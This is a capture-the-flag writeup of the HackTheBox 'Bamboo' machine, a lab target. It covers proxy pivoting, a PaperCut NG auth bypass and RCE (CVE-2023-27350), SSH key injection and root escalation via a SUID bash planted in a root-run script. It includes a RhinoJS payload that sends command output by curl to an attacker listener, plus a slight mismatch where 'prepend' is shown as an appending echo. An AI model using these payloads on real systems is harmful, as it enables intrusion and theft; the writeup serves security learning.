# Bamboo - HackTheBox Writeup

**Machine**: Bamboo
**OS**: Ubuntu 22.04 (Jammy)
**IP**: 10.129.238.16
**Difficulty**: Medium

---

## TL;DR

A Squid HTTP proxy on port 3128 lets us reach an internal PaperCut NG 22.0.6 instance. We exploit CVE-2023-27350 (authentication bypass + printer script RCE) to land a shell as `papercut`. For root, we abuse the fact that `server-command` is owned by our user but gets executed as root when we trigger a Mobility Print server refresh from the PaperCut Print Deploy admin panel.

---

## Enumeration

### Nmap

A quick scan reveals two open ports:

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu
3128/tcp open  http-proxy Squid http proxy 5.9
```

SSH is standard, nothing interesting there yet. The Squid proxy is the way in.

### Poking at the Squid Proxy

Squid is an HTTP proxy -- it forwards web requests on your behalf. The interesting thing here is that it might let us access services bound to `localhost` on the target that we can't reach directly from the outside.

After some probing of common internal ports through the proxy, we find **PaperCut NG** running on `127.0.0.1:9191`. PaperCut is a print management application. Visiting the admin panel through the proxy:

```bash
curl -x http://10.129.238.16:3128 http://127.0.0.1:9191/app
```

This loads the PaperCut NG admin login page and reveals the version: **22.0.6 (Build 63825)**.

---

## Initial Access - CVE-2023-27350

### The Vulnerability

PaperCut NG versions before 22.0.9 have a critical authentication bypass (CVE-2023-27350, CVSS 9.8). The setup wizard endpoint `/app?service=page/SetupCompleted` can be accessed without any authentication and gives you a fully authenticated admin session. From there, you can enable "print scripting" -- a feature that lets admins run scripts on print events -- and use it to execute arbitrary commands on the server.

The attack chain:
1. Hit `/app?service=page/SetupCompleted` to get an admin session cookie
2. Use the Config Editor to enable `print-and-device.script.enabled` and disable `print.script.sandboxed`
3. Select a printer and inject a RhinoJS script that calls `java.lang.Runtime.getRuntime().exec()`
4. The script runs our OS command and sends back the output

### Exploitation

All of our traffic goes through the Squid proxy since PaperCut only listens on localhost. Here's the exploit (`rce.py`) in action:

```python
PROXY = {"http": "http://10.129.238.16:3128"}
TARGET = "http://127.0.0.1:9191"
```

The RhinoJS payload runs a command and exfiltrates the output via an HTTP callback:

```javascript
var runtime = java.lang.Runtime.getRuntime();
var proc = runtime.exec(["/bin/bash", "-c",
    "<CMD> 2>&1 | base64 -w0 | xargs -I{} curl http://<LHOST>:8888/data/{}"]);
proc.waitFor();
```

We spin up a local HTTP server to catch the base64-encoded output, then run:

```bash
python3 rce.py "id"
# uid=1001(papercut) gid=1001(papercut) groups=1001(papercut)
```

We're running as `papercut`.

### Getting a Proper Shell

Rather than dealing with the clunky callback-based RCE for every command, we inject an SSH key for persistent access:

```bash
python3 rce.py "mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA...' >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys"
```

Now we can SSH in directly:

```bash
ssh -i /tmp/bamboo_key papercut@10.129.238.16
```

### User Flag

```bash
papercut@bamboo:~$ cat ~/user.txt
```

---

## Privilege Escalation

### Looking Around

Once on the box as `papercut`, the first thing to notice is what's running as root:

```bash
ps aux | grep root
```

Two PaperCut-related processes stand out running as **root**:

```
root  502  /home/papercut/providers/print-deploy/linux-x64/pc-print-deploy
root  560  v2023-02-14-1341/pc-print-deploy-server -dataDir=...
```

These are the **PaperCut Print Deploy** service and its server component. They run as root (the systemd service has no `User=` directive) but the binaries live inside `/home/papercut/` -- which we own.

The systemd service file confirms this:

```ini
# /etc/systemd/system/pc-print-deploy.service
[Service]
ExecStart=/home/papercut/providers/print-deploy/linux-x64/pc-print-deploy
Restart=always
RestartSec=120
```

### The server-command Vector

There's another interesting file:

```bash
ls -la ~/server/bin/linux-x64/server-command
-rwxr-xr-x 1 papercut papercut 456 ... server-command
```

`server-command` is a shell script wrapper owned by `papercut`. It sources some environment variables and launches a Java class. The key insight: **this script gets executed as root** when certain PaperCut admin actions are triggered -- specifically, operations from the Print Deploy admin panel.

### Planting the Payload

Since we own the file, we just prepend our payload:

```bash
echo 'chmod u+s /bin/bash' >> ~/server/bin/linux-x64/server-command
```

The modified script now looks like:

```sh
#!/bin/sh
chmod u+s /bin/bash
#
# (c) Copyright 1999-2013 PaperCut Software International Pty Ltd
# A wrapper for server-command
. `dirname $0`/.common
# ... rest of the Java command ...
```

When root runs this script, the very first thing it does is set the SUID bit on `/bin/bash`.

### Triggering Execution

Now we need root to actually run `server-command`. This happens when we trigger a **Mobility Print server refresh** from the Print Deploy admin panel.

The PaperCut admin interface has a Print Deploy section that loads as an iframe. Inside that iframe is a React single-page app with a "Refresh servers" button for Mobility Print integration. Clicking it hits this API endpoint:

```
GET /print-deploy/admin/api/mobilityServers/v2?refresh=true
```

We can trigger this with a simple curl from the target, using an authenticated PaperCut session (obtained via the same SetupCompleted auth bypass):

```bash
# Get an authenticated session
curl -sv -c /tmp/cookies.txt "http://localhost:9191/app?service=page/SetupCompleted"

# Trigger the Mobility Print server refresh
curl -b /tmp/cookies.txt "http://localhost:9191/print-deploy/admin/api/mobilityServers/v2?refresh=true"
```

The API returns `[]` (empty array -- no Mobility Print servers found), but the important thing is that behind the scenes, PaperCut ran `server-command` as root to process the request.

### Getting Root

```bash
papercut@bamboo:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

The `s` in `-rwsr-xr-x` means SUID is set. Now any user can run bash with root's effective UID:

```bash
papercut@bamboo:~$ bash -p
bash-5.1# whoami
root
```

### Root Flag

```bash
bash-5.1# cat /root/root.txt

```

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| Recon | Nmap scan | Found SSH (22) and Squid proxy (3128) |
| Recon | Proxy enumeration | Found PaperCut NG 22.0.6 on localhost:9191 |
| Foothold | CVE-2023-27350 | Auth bypass + RCE via printer scripting as `papercut` |
| Persistence | SSH key injection | Interactive shell access |
| Privesc | Modified `server-command` | Added `chmod u+s /bin/bash` to papercut-owned script |
| Privesc | Mobility Print API trigger | `GET /print-deploy/admin/api/mobilityServers/v2?refresh=true` caused root to execute our payload |
| Root | `bash -p` | SUID bash gives effective root |


